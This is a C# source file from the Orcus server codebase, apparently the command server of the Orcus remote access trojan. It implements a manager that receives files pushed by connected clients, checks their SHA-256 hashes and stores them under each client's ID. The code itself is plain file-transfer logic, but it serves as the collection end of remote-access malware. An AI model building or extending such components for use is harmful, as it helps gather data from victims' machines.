using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using NLog;
using Orcus.Server.Core.Args;
using Orcus.Server.Core.Config;

namespace Orcus.Server.Core.Database.FileSystem
{
    public class PushManager
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private readonly DatabaseManager _databaseManager;
        private readonly List<FilePushRequest> _activePushes;
        private readonly List<FilePushRequest> _pushRequests;
        private readonly object _executionLock = new object();
        private readonly int _maxActivePushes;

        public PushManager(DatabaseManager databaseManager)
        {
            _databaseManager = databaseManager;
            _pushRequests = new List<FilePushRequest>();
            _activePushes = new List<FilePushRequest>();
            if (Directory.Exists("temp"))
                Directory.Delete("temp", true);
            _maxActivePushes =
                int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("DATA_MANAGER", "MaxParallelTransfers"));
        }

        public void PushRequest(Guid guid, Client client)
        {
            Logger.Debug("Push request ({0:N}) received from client CI-{1}", guid, client.Id);

            lock (_executionLock)
            {
                var pushRequest = new FilePushRequest {Client = client, Guid = guid, Timestamp = DateTime.UtcNow};
                if (_activePushes.Count <= _maxActivePushes)
                {
                    ExecutePushRequest(pushRequest);
                }
                else
                {
                    _pushRequests.Add(pushRequest);
                    Logger.Debug("Push request ({0:N}) of CI-{1} must be delayed; active pushes = {2}", guid, client.Id, _activePushes.Count);
                }
            }
        }

        private void ExecutePushRequest(FilePushRequest filePushRequest)
        {
            if (filePushRequest.Client.IsDisposed)
                return;

            Logger.Debug("Begin execute push request {0:D} of client CI-{1}", filePushRequest.Guid,
                filePushRequest.Client.Id);

            _activePushes.Add(filePushRequest);
            new Thread(() =>
            {
                try
                {
                    AcceptPushRequest(filePushRequest);
                }
                catch (Exception)
                {
                    // ignored
                }
                finally
                {
                    lock (_executionLock)
                    {
                        _activePushes.Remove(filePushRequest);
                        if (_pushRequests.Count > 0 && _activePushes.Count <= _maxActivePushes)
                        {
                            var pushRequest = _pushRequests[0];
                            ExecutePushRequest(pushRequest);
                            _pushRequests.Remove(pushRequest);
                        }
                    }

                    if (_activePushes.Count == 0 && Directory.Exists("temp"))
                        Directory.Delete("temp", true);
                }
            }) {Name = $"PushRequest_{filePushRequest.Guid:N}", IsBackground = true}.Start();
        }

        private void AcceptPushRequest(FilePushRequest filePushRequest)
        {
            Logger.Info("File transfer request {0:D} from client CI-{1} accepted", filePushRequest.Guid,
                filePushRequest.Client.Id);
            using (var autoResetEventHandler = new AutoResetEvent(false))
            {
                var isFinished = false;
                long fileLength = 0;
                byte[] fileHash = null;
                Guid dataMode = Guid.Empty;
                string entryName = null;
                var isFile = false;
                bool transferSuccessful = false;

                Logger.Debug("(PushRequest {0:D}) Create temp directory", filePushRequest.Guid);
                var tempDirectory = new DirectoryInfo("temp");
                if (!tempDirectory.Exists)
                    tempDirectory.Create();

                var fileName = Path.Combine(tempDirectory.FullName, filePushRequest.Guid.ToString("N"));
                while (File.Exists(fileName))
                    fileName = Path.Combine(tempDirectory.FullName, Guid.NewGuid().ToString("N"));

                Logger.Debug("(PushRequest {0:D}) Open file stream, path = {1}", filePushRequest.Guid, fileName);

                using (var fileStream = new FileStream(fileName, FileMode.CreateNew, FileAccess.ReadWrite))
                {
                    EventHandler<FilePushEventArgs> handler = (s, e) =>
                    {
                        if (e.FileTransferGuid != filePushRequest.Guid)
                            return;

                        if (e.PackageType == FilePushPackageType.Header)
                        {
                            fileLength = BitConverter.ToInt64(e.Data, 16);
                            fileHash = new byte[32];
                            Array.Copy(e.Data, 24, fileHash, 0, 32);
                            var tempGuid = new byte[16];
                            Array.Copy(e.Data, 56, tempGuid, 0, 16);
                            dataMode = new Guid(tempGuid);
                            isFile = e.Data[72] == 1;
                            entryName = Encoding.UTF8.GetString(e.Data, 73, e.Data.Length - 73);
                            Logger.Info(
                                "Header of file transfer {0:D} from client CI-{1} received: FileLength={2},EntryName='{3}'",
                                filePushRequest.Guid, filePushRequest.Client.Id, fileLength, entryName);
                        }
                        else
                        {
                            fileStream.Write(e.Data, 16, e.Data.Length - 16);
                            if (fileStream.Length == fileLength)
                                isFinished = true;
                        }

                        autoResetEventHandler.Set();
                    };
                    filePushRequest.Client.FilePush += handler;

                    try
                    {
                        var timeout =
                            int.Parse(
                                GlobalConfig.Current.IniFile.GetKeyValue("DATA_MANAGER", "WaitTimeout"));
                        filePushRequest.Client.AcceptPush(filePushRequest.Guid);
                        while (!isFinished)
                        {
                            if (!autoResetEventHandler.WaitOne(timeout))
                            {
                                Logger.Debug("(PushRequest {0:D}) Data transfer timed out", filePushRequest.Guid);
                                return;
                            }
                        }

                        Logger.Debug("(PushRequest {0:D}) Data transfer finished, calculating hash value", filePushRequest.Guid);
                        fileStream.Position = 0;
                        using (var sha256 = new SHA256Managed())
                        {
                            if (!sha256.ComputeHash(fileStream).SequenceEqual(fileHash))
                            {
                                fileStream.Close();
                                File.Delete(fileName);
                                Logger.Info(
                                    "Hash comparison of file transfer {0:D} from client CI-{1} failed. Removing files...",
                                    filePushRequest.Guid, filePushRequest.Client.Id);
                                return;
                            }
                        }

                        Logger.Debug("(PushRequest {0:D}) Hash values match, transfer succeeded", filePushRequest.Guid);

                        filePushRequest.Client.FileTransferCompleted(filePushRequest.Guid);
                        Logger.Info("File transfer {0:D} from client CI-{1} completed", filePushRequest.Guid,
                            filePushRequest.Client.Id);
                        transferSuccessful = true;
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                    finally
                    {
                        filePushRequest.Client.FilePush -= handler;
                    }
                }

                if (!transferSuccessful)
                {
                    Logger.Debug("(PushRequest {0:D}) Remove file", filePushRequest.Guid);
                    File.Delete(fileName);
                }
                else
                {
                    var fileNameGuid = DataSystem.StoreFile(fileName);
                    _databaseManager.AddDataEntry(filePushRequest.Client.Id, fileLength, fileNameGuid, dataMode,
                        entryName, !isFile);
                }
            }
        }
    }
}